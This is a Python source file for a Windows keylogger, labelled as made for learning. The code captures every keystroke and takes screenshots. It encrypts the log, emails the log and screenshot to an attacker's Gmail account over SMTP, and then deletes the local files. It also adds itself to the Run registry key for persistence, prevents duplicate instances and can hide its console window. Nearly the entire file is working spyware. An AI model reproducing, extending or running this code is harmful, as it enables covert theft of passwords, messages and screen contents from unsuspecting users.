## Made by Gil Mansharov
## For learning porpuses only

import pyHook, pythoncom
import autopy
import threading
import os.path
import os
import smtplib
import email
import time
from email.MIMEMultipart import MIMEMultipart
from email.Utils import COMMASPACE
from email.MIMEBase import MIMEBase
from email.parser import Parser
from email.MIMEImage import MIMEImage
from email.MIMEText import MIMEText
from email.MIMEAudio import MIMEAudio
import mimetypes
import win32event, win32api, winerror
import sys
from _winreg import *



#Email details for sending the keylogger (default: GMAIL)
class Email:
    username = 'YourEmail@gmail.com'
    password = 'YourPassword'
    server = "smtp.gmail.com"
    smtp_port = 465
    From = username
    tolist = username.split()
    To = email.Utils.COMMASPACE.join(username)
    Subject = "This is keylogger"
    Message = email.MIMEMultipart.MIMEMultipart()
    Message['From'] = From
    Message['To'] = email.Utils.COMMASPACE.join(tolist)
    Message['Subject'] = Subject
    
#Contains all necessary things for the keylogger to work    
class Keylogger:
    i = ''      #The strings inserted here
    key = "password"    #The key that the log file is encrypted with
    log_path = os.path.join("C:/", "Keylogger/", "keylogger.txt")    #the path to save the log file (deleted afterwards)
    screenshot_path = os.path.join("C:/", "Keylogger/", "screenshot.png")    #The path to save the screenshot image (deleted afterwards)
    MAX_KEYSTROKES = 100    #In which length the log file should be sent

#Allows the keylogger to run at the background
class myThread (threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
    def run(self):
        main()

def addStartup():
	if getattr(sys, 'frozen', False):
		fp = os.path.dirname(os.path.realpath(sys.executable))
	elif __file__:
		fp = os.path.dirname(os.path.realpath(__file__))
	file_name=sys.argv[0].split("\\")[-1]
	new_file_path=fp+"\\"+file_name
	keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

	key2change= OpenKey(HKEY_CURRENT_USER,
	keyVal,0,KEY_ALL_ACCESS)

	SetValueEx(key2change, "logger",0,REG_SZ, new_file_path)


#Disallowing multiple instances of the keylogger
def disallow_Multiple_Instances():
    mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        mutex = None
        exit(0)
    x=''
    data=''
    count=0

# Write an encrypted file with the Keylogger keys
def writeToFile(): 
    file = open(Keylogger.log_path, "a")
    file.write(xor(Keylogger.i, Keylogger.key))
    file.close()
    return True

#Deleting traces of the file with the hooked keys and the screenshot
def DeleteFiles():
    os.remove(Keylogger.log_path)
    os.remove(Keylogger.screenshot_path)
    return True

#Sending The Hooked keys to email and then deleting the attached files and resetting the message at the Email class
def send_Email():
    file = open(Keylogger.log_path, "r")
    str = file.read()
    file.close()
    Email.Message.attach(MIMEText(xor(str, Keylogger.key)))
    Email.Message.attach(MIMEImage(open(Keylogger.screenshot_path, 'rb').read()))
    try:
        server_ssl = smtplib.SMTP_SSL()
        server_ssl.connect(Email.server, Email.smtp_port)
        server_ssl.ehlo()
        server_ssl.login(Email.username, Email.password)
        server_ssl.sendmail(Email.From, Email.tolist, Email.Message.as_string())
        server_ssl.quit()
        server_ssl.close()
        print 'succesfully sent email'
    except:
        print 'failed to send email'
    DeleteFiles()
    Email.Message = email.MIMEMultipart.MIMEMultipart()

#Taking screenshot and saving it to the location defined in the Keylogger class
def take_screenshot():
    bitmap = autopy.bitmap.capture_screen()
    bitmap.save(Keylogger.screenshot_path)
    

#Filtering Keystrokes to cases
def KeyFilters(event):
    if (event.KeyID is 13):
        Keylogger.i += ' [Enter] '
    elif (event.KeyID is 162 or event.KeyID is 163):
        Keylogger.i += ' [CTRL] '
    elif (event.KeyID is 164 or event.KeyID is 165):
        Keylogger.i += ' [ALT] '
    elif (event.KeyID is 8):
        Keylogger.i += ' [BackSpace] '
    elif (event.KeyID is 160 or event.KeyID is 161):
        Keylogger.i += ' [SHIFT] '
    elif (event.KeyID is 46):
        Keylogger.i += ' [Delete] '
    elif (event.KeyID is 32):
        Keylogger.i += ' [Space] '
    elif (event.KeyID is 27):
        Keylogger.i += ' [Escape] '
    elif (event.KeyID is 9):
        Keylogger.i += ' [TAB] '
    elif (event.KeyID is 20):
        Keylogger.i += ' [CapsLock] '
    elif (event.KeyID is 38):
        Keylogger.i += ' [Up] '
    elif (event.KeyID is 40):
        Keylogger.i += ' [Down] '
    elif (event.KeyID is 37):
        Keylogger.i += ' [Left] '
    elif (event.KeyID is 91):
        Keylogger.i += ' [Windows] '
    else:
        Keylogger.i += chr(event.Ascii)
    return True

#XOR Encryption Algorithm
def xor(data, key):
    output = ""
    for i, character in enumerate(data):
        output += chr(ord(character) ^ ord(key[i % len(key)]))
    return output

#Initializing variables and objects for the next round
def initialize():
    hm.UnhookKeyboard()
    Keylogger.i = None
    Keylogger.i = ''
    hm.HookKeyboard()

#Writing keystrokes to a file, taking screenshot and sending it to email <- only after the log file reached it's max length
def sending_procedure():
    if len(Keylogger.i) > Keylogger.MAX_KEYSTROKES:
        writeToFile()
        take_screenshot()
        send_Email()
        initialize()

#Keystrokes listener
def OnKeyboardEvent(event):
    KeyFilters(event)
    sending_procedure()

#hiding console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

#running the keylogger
def main():
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()

##hide()
addStartup()
hm = pyHook.HookManager()
disallow_Multiple_Instances()
thread = myThread(1, "Thread", 1)
thread.start()





    
    

